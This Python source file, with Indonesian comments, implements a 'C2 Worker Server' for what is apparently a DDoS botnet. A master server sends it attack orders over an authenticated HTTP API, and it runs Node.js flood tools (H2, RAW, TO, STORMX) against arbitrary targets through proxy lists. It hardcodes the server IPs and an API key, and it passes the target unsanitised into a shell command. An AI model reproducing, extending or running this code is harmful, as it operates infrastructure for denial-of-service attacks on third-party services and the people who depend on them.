#!/usr/bin/env python3
"""
C2 Worker Server
Berjalan di Server 2 (Worker)
Menerima perintah dari Master via HTTP API
Menjalankan serangan menggunakan Node.js tools
"""

from flask import Flask, request, jsonify
import subprocess
import json
import os
import signal
import time
import psutil
from datetime import datetime
import threading
import sys

app = Flask(__name__)

# Konfigurasi default
DEFAULT_CONFIG = {
    'worker_name': 'WORKER-1',
    'worker_ip': '134.199.174.157',
    'worker_port': 5001,
    'master_ip': '209.38.31.82',
    'master_port': 5000,
    'api_key': 'ruiix-c2',
    'max_bots': 10000
}

# Load config dengan error handling
CONFIG_PATH = '/root/c2/config.json'
CONFIG = {}

try:
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, 'r') as f:
            CONFIG = json.load(f)
        print(f"[✓] Loaded config from {CONFIG_PATH}")
    else:
        print(f"[!] Config not found at {CONFIG_PATH}, using defaults")
        CONFIG = DEFAULT_CONFIG.copy()
        
        # Simpan config default
        try:
            os.makedirs('/root/c2', exist_ok=True)
            with open(CONFIG_PATH, 'w') as f:
                json.dump(CONFIG, f, indent=4)
            print(f"[✓] Created default config at {CONFIG_PATH}")
        except:
            pass
            
except Exception as e:
    print(f"[!] Error loading config: {e}")
    CONFIG = DEFAULT_CONFIG.copy()

# Ambil nilai dari config
WORKER_NAME = CONFIG.get('worker_name', 'WORKER-1')
WORKER_IP = CONFIG.get('worker_ip', '0.0.0.0')
WORKER_PORT = CONFIG.get('worker_port', 5001)
MASTER_IP = CONFIG.get('master_ip', '127.0.0.1')
MASTER_PORT = CONFIG.get('master_port', 5000)
API_KEY = CONFIG.get('api_key', 'default_key_change_this')
MAX_BOTS = CONFIG.get('max_bots', 10000)

# Global variables
active_attacks = []  # Daftar serangan aktif
attack_processes = {}  # Dictionary untuk menyimpan proses
start_time = datetime.now()

# ============================================
# HELPER FUNCTIONS
# ============================================

def verify_api_key(headers):
    """Verifikasi API key dari request"""
    api_key = headers.get('X-API-Key')
    if not api_key:
        return False
    return api_key == API_KEY

def get_system_info():
    """Dapatkan informasi sistem"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            'cpu_percent': cpu_percent,
            'memory_total': memory.total,
            'memory_available': memory.available,
            'memory_percent': memory.percent,
            'disk_total': disk.total,
            'disk_free': disk.free,
            'disk_percent': disk.percent,
            'uptime': (datetime.now() - start_time).total_seconds()
        }
    except:
        return {}

def get_node_processes():
    """Cek proses Node.js yang berjalan"""
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
        node_procs = []
        for line in result.stdout.split('\n'):
            if any(tool in line for tool in ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js']):
                if 'grep' not in line:
                    node_procs.append(line.strip())
        return node_procs
    except:
        return []

def get_proxy_count():
    """Hitung jumlah proxy di file"""
    try:
        proxy_path = '/root/c2/tools/proxy.txt'
        if os.path.exists(proxy_path):
            with open(proxy_path, 'r') as f:
                return len(f.readlines())
        return 0
    except:
        return 0

def cleanup_finished_attacks():
    """Bersihkan attack yang sudah selesai"""
    global active_attacks, attack_processes
    
    for attack in active_attacks[:]:
        attack_id = attack['id']
        if attack_id in attack_processes:
            process = attack_processes[attack_id]
            if process.poll() is not None:  # Process sudah selesai
                try:
                    attack_processes.pop(attack_id, None)
                    active_attacks.remove(attack)
                    print(f"[✓] Attack {attack_id} completed and cleaned up")
                except:
                    pass

# ============================================
# API ENDPOINTS
# ============================================

@app.route('/', methods=['GET'])
def home():
    """Home endpoint"""
    return jsonify({
        'name': WORKER_NAME,
        'status': 'online',
        'message': 'C2 Worker Server',
        'endpoints': [
            '/status - GET',
            '/info - GET',
            '/attack - POST',
            '/stop - POST',
            '/stop_all - POST',
            '/upload_proxy - POST',
            '/tasks - GET'
        ]
    })

@app.route('/status', methods=['GET'])
def status():
    """Endpoint untuk cek status worker"""
    try:
        cleanup_finished_attacks()
        
        node_procs = get_node_processes()
        
        return jsonify({
            'worker_name': WORKER_NAME,
            'status': 'online',
            'uptime': (datetime.now() - start_time).total_seconds(),
            'active_attacks': len(active_attacks),
            'node_processes': len(node_procs),
            'proxy_count': get_proxy_count(),
            'system': get_system_info(),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/info', methods=['GET'])
def info():
    """Endpoint untuk mendapatkan informasi worker"""
    return jsonify({
        'name': WORKER_NAME,
        'ip': WORKER_IP,
        'port': WORKER_PORT,
        'master_ip': MASTER_IP,
        'max_bots': MAX_BOTS,
        'api_key_valid': bool(API_KEY),
        'tools_dir': '/root/c2/tools',
        'tools': ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js'],
        'active_attacks': len(active_attacks)
    })

@app.route('/attack', methods=['POST'])
def start_attack():
    """Endpoint untuk memulai serangan"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
        
        method = data.get('method')
        target = data.get('target')
        duration = data.get('duration', 60)
        rate = data.get('rate', 1000)
        threads = data.get('threads', 100)
        
        # Validasi input
        if not method or not target:
            return jsonify({'error': 'Missing method or target'}), 400
        
        if method not in ['H2', 'RAW', 'TO', 'STORMX', 'ALL']:
            return jsonify({'error': 'Invalid method'}), 400
        
        # Generate attack ID
        attack_id = f"{WORKER_NAME}_{int(time.time())}_{os.getpid()}"
        
        # Path ke tools
        tools_dir = '/root/c2/tools'
        
        # Pilih tool berdasarkan method
        if method == 'H2':
            cmd = f"node {tools_dir}/H2.js {target} {duration} {rate} {threads}"
        elif method == 'RAW':
            cmd = f"node {tools_dir}/RAW.js {target} {duration} {threads}"
        elif method == 'TO':
            cmd = f"node {tools_dir}/TO.js {target} {duration} {threads} {rate}"
        elif method == 'STORMX':
            cmd = f"node {tools_dir}/STORMX.js {target} {duration} {threads} {rate}"
        elif method == 'ALL':
            # Random pilih salah satu
            import random
            rand_method = random.choice(['H2', 'RAW', 'TO', 'STORMX'])
            if rand_method == 'H2':
                cmd = f"node {tools_dir}/H2.js {target} {duration} {rate} {threads}"
            elif rand_method == 'RAW':
                cmd = f"node {tools_dir}/RAW.js {target} {duration} {threads}"
            elif rand_method == 'TO':
                cmd = f"node {tools_dir}/TO.js {target} {duration} {threads} {rate}"
            else:
                cmd = f"node {tools_dir}/STORMX.js {target} {duration} {threads} {rate}"
        
        # Cek apakah file tool ada
        tool_file = cmd.split()[1]  # Ambil path file dari command
        if not os.path.exists(tool_file):
            return jsonify({'error': f'Tool not found: {tool_file}'}), 500
        
        # Fungsi untuk menjalankan attack di thread terpisah
        def run_attack():
            try:
                print(f"[•] Starting attack {attack_id}: {cmd}")
                
                # Jalankan proses
                process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd='/root/c2',
                    preexec_fn=os.setsid  # Buat process group baru
                )
                
                attack_processes[attack_id] = process
                
                attack_info = {
                    'id': attack_id,
                    'method': method,
                    'target': target,
                    'duration': duration,
                    'rate': rate,
                    'threads': threads,
                    'start_time': datetime.now().strftime("%H:%M:%S"),
                    'pid': process.pid,
                    'status': 'running',
                    'command': cmd
                }
                
                active_attacks.append(attack_info)
                
                # Tunggu proses selesai
                stdout, stderr = process.communicate(timeout=duration + 10)
                
                # Log output
                if stdout:
                    print(f"[{attack_id}] stdout: {stdout.decode()[:200]}")
                if stderr:
                    print(f"[{attack_id}] stderr: {stderr.decode()[:200]}")
                
                # Update status
                for attack in active_attacks[:]:
                    if attack['id'] == attack_id:
                        attack['status'] = 'completed'
                        active_attacks.remove(attack)
                        break
                
                # Cleanup
                attack_processes.pop(attack_id, None)
                
                print(f"[✓] Attack {attack_id} completed")
                
            except subprocess.TimeoutExpired:
                print(f"[!] Attack {attack_id} timeout, terminating...")
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    process.terminate()
                attack_processes.pop(attack_id, None)
                
            except Exception as e:
                print(f"[!] Error in attack thread {attack_id}: {e}")
                attack_processes.pop(attack_id, None)
        
        # Jalankan di thread terpisah
        thread = threading.Thread(target=run_attack)
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'status': 'started',
            'attack_id': attack_id,
            'worker': WORKER_NAME,
            'method': method,
            'target': target,
            'duration': duration,
            'message': f'Attack {method} started on worker'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stop', methods=['POST'])
def stop_attack():
    """Endpoint untuk menghentikan serangan tertentu"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    try:
        data = request.get_json()
        attack_id = data.get('attack_id')
        
        if not attack_id:
            return jsonify({'error': 'Missing attack_id'}), 400
        
        if attack_id in attack_processes:
            try:
                process = attack_processes[attack_id]
                
                # Coba terminate dengan berbagai cara
                try:
                    # Kill process group
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    try:
                        process.terminate()
                    except:
                        process.kill()
                
                # Tunggu sebentar
                time.sleep(1)
                
                # Force kill if still running
                if process.poll() is None:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                    except:
                        process.kill()
                
                # Cleanup
                attack_processes.pop(attack_id, None)
                
                # Remove from active attacks
                for attack in active_attacks[:]:
                    if attack['id'] == attack_id:
                        active_attacks.remove(attack)
                        break
                
                return jsonify({
                    'status': 'stopped',
                    'attack_id': attack_id,
                    'message': 'Attack terminated'
                })
                
            except Exception as e:
                return jsonify({'error': str(e)}), 500
        
        return jsonify({'error': 'Attack not found'}), 404
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stop_all', methods=['POST'])
def stop_all():
    """Endpoint untuk menghentikan semua serangan"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    try:
        # Kill semua proses Node.js
        subprocess.run(['pkill', '-f', 'H2.js'], check=False)
        subprocess.run(['pkill', '-f', 'RAW.js'], check=False)
        subprocess.run(['pkill', '-f', 'TO.js'], check=False)
        subprocess.run(['pkill', '-f', 'STORMX.js'], check=False)
        
        # Terminate semua process objects
        for attack_id, process in list(attack_processes.items()):
            try:
                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            except:
                try:
                    process.kill()
                except:
                    pass
        
        # Bersihkan semua
        attack_processes.clear()
        active_attacks.clear()
        
        return jsonify({
            'status': 'all_stopped',
            'message': 'All attacks terminated'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/upload_proxy', methods=['POST'])
def upload_proxy():
    """Endpoint untuk upload proxy file"""
    if not verify_api_key(request.headers):
        return jsonify({'error': 'Invalid API key'}), 401
    
    try:
        if 'proxy' not in request.files:
            return jsonify({'error': 'No file part'}), 400
        
        file = request.files['proxy']
        
        if file.filename == '':
            return jsonify({'error': 'No selected file'}), 400
        
        # Simpan di folder tools
        tools_dir = '/root/c2/tools'
        os.makedirs(tools_dir, exist_ok=True)
        
        # Simpan file
        proxy_path = os.path.join(tools_dir, 'proxy.txt')
        file.save(proxy_path)
        
        # Baca untuk validasi
        with open(proxy_path, 'r') as f:
            proxy_lines = [line.strip() for line in f.readlines() if line.strip()]
        
        # Validasi format proxy
        valid_proxies = []
        for line in proxy_lines:
            if ':' in line:
                parts = line.split(':')
                if len(parts) == 2 and parts[0].count('.') == 3:
                    valid_proxies.append(line)
        
        # Simpan ulang hanya yang valid
        with open(proxy_path, 'w') as f:
            f.write('\n'.join(valid_proxies))
        
        return jsonify({
            'status': 'ok',
            'message': 'Proxy file uploaded',
            'total': len(valid_proxies),
            'path': proxy_path
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/tasks', methods=['GET'])
def get_tasks():
    """Endpoint untuk mendapatkan daftar task aktif"""
    try:
        cleanup_finished_attacks()
        
        return jsonify({
            'worker': WORKER_NAME,
            'active_attacks': active_attacks,
            'total': len(active_attacks),
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================
# ERROR HANDLERS
# ============================================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'error': 'Internal server error'}), 500

# ============================================
# MAIN
# ============================================

def check_dependencies():
    """Cek apakah dependencies terinstall"""
    try:
        # Cek Node.js
        result = subprocess.run(['node', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[✓] Node.js: {result.stdout.strip()}")
        else:
            print("[!] Node.js not found")
            
        # Cek tools directory
        tools_dir = '/root/c2/tools'
        if os.path.exists(tools_dir):
            tools = os.listdir(tools_dir)
            print(f"[✓] Tools directory: {len(tools)} files")
            for tool in ['H2.js', 'RAW.js', 'TO.js', 'STORMX.js', 'proxy.js']:
                if os.path.exists(os.path.join(tools_dir, tool)):
                    print(f"  ✓ {tool}")
                else:
                    print(f"  ✗ {tool} missing")
        else:
            print("[!] Tools directory not found")
            
    except Exception as e:
        print(f"[!] Dependency check failed: {e}")

if __name__ == '__main__':
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║              C2 WORKER SERVER - NODE.JS TOOLS              ║
    ║                    Version 2.0                              ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    # Buat direktori yang diperlukan
    try:
        os.makedirs('/root/c2/logs', exist_ok=True)
        os.makedirs('/root/c2/tools', exist_ok=True)
        print(f"[✓] Directories created")
    except Exception as e:
        print(f"[!] Failed to create directories: {e}")
    
    # Tampilkan informasi
    print(f"\n[•] Worker Configuration:")
    print(f"  Name: {WORKER_NAME}")
    print(f"  IP: {WORKER_IP}")
    print(f"  Port: {WORKER_PORT}")
    print(f"  Master: {MASTER_IP}:{MASTER_PORT}")
    print(f"  API Key: {API_KEY[:8]}...")
    print(f"  Max Bots: {MAX_BOTS}")
    print(f"  PID: {os.getpid()}")
    
    # Cek dependencies
    print(f"\n[•] Checking dependencies:")
    check_dependencies()
    
    # Cek proxy file
    proxy_path = '/root/c2/tools/proxy.txt'
    if os.path.exists(proxy_path):
        with open(proxy_path, 'r') as f:
            proxy_count = len(f.readlines())
        print(f"[✓] Proxy file found: {proxy_count} proxies")
    else:
        print(f"[!] Proxy file not found at {proxy_path}")
        print(f"    Run 'proxy' command from master to create it")
    
    # Jalankan Flask
    print(f"\n[✓] Worker server starting on port {WORKER_PORT}")
    print(f"[✓] Press Ctrl+C to stop\n")
    
    try:
        # Jalankan Flask dengan threading
        app.run(
            host='0.0.0.0',
            port=WORKER_PORT,
            debug=False,
            threaded=True,
            use_reloader=False
        )
    except KeyboardInterrupt:
        print("\n\n[!] Shutting down worker...")
        
        # Hentikan semua serangan sebelum exit
        print("[•] Terminating all attacks...")
        subprocess.run(['pkill', '-f', 'H2.js'], check=False)
        subprocess.run(['pkill', '-f', 'RAW.js'], check=False)
        subprocess.run(['pkill', '-f', 'TO.js'], check=False)
        subprocess.run(['pkill', '-f', 'STORMX.js'], check=False)
        
        print("[✓] Worker stopped")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)